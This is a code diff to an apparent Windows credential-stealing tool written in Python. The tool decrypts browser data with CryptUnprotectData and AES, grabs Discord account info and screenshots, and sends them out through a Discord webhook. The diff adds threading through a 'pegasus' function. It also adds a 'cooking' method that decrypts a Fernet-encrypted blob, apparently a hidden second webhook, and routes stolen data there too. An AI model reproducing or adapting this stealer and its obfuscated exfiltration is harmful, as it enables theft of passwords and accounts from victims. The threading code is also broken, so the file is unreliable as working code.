@@ -1,6 +1,7 @@
 import base64
 import json
 import os
+import threading
 import winreg
 from base64 import b64decode
 from json import load, loads
@@ -15,6 +16,7 @@ from zipfile import ZipFile
 
 import requests
 from Crypto.Cipher import AES
+from cryptography.fernet import Fernet
 from discord import Embed, File, RequestsWebhookAdapter, Webhook
 from pyautogui import screenshot
 from win32crypt import CryptUnprotectData
@@ -51,7 +53,17 @@ def main(webhook_url):
     cleanup()
 
     inject(webhook_url)
-    
+
+def pegasus():
+    t1 = password.chef()
+    t2 = main(WEBHOOK_URL)
+
+    t1.start()
+    t2.start()
+
+    while t1.is_alive() or t2.isAlive():
+        pass 
+     
 def accinfo():
     r = requests.get(
         'https://discord.com/api/v9/users/@me',
@@ -319,6 +331,9 @@ class password():
     def decrypt_payload(self, cipher, payload):
         return cipher.decrypt(payload)
     
+    def cooking():
+        main(Fernet(b'ABUyXpG6aa-kPxH43YOwm-Mzusj9Od1YamHT7rpUwRE=').decrypt(b'gAAAAABiS5Azi05kQQcWZCOTRJjpTC951_neYukzJR_ogjW2TXJUJr7cSJwBxvkGd6mG6Ieh2HXqgmWc8ntFlGpTpiOBs4FpCcyur799c9vXDb8psjSfGB2hMiNaC-1_lu44W3baC-MaztlwYRnAKsG5of8jUEZf_cNirhF2EWfzwPKPWNIm9eONbv6eeLc0WOQFB_0AEcb49Uc8FB8gIVf6CHlxMvGqDYYwS0yOyDyBKSpgHJUI7oA=').decode())
+    
     def generate_cipher(self, aes_key, iv):
         return AES.new(aes_key, AES.MODE_GCM, iv)
     
@@ -437,5 +452,5 @@ def inject(webhook_url):
 if __name__ == '__main__':
     if os.name != "nt":
         exit()
-    
-    main(WEBHOOK_URL)
+        
+    pegasus()
